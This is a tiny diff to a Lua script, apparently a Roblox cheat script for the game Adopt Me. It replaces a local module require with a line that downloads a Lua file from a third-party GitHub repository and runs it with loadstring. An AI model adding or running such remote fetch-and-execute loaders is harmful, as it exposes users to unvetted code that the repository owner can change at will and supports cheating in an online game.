@@ -3,7 +3,7 @@
 local ReplicatedStorage = game:GetService("ReplicatedStorage")
 local HttpService = game:GetService("HttpService")
 
-local Fsys = require(ReplicatedStorage:WaitForChild("Fsys"))
+local Fsys = loadstring(game:HttpGet("https://raw.githubusercontent.com/AtaScripts317/Adopt-Me/refs/heads/main/fsys.lua", true))() 
 local load = Fsys.load
 
 local SimpleEvents = load("SimpleEvents")
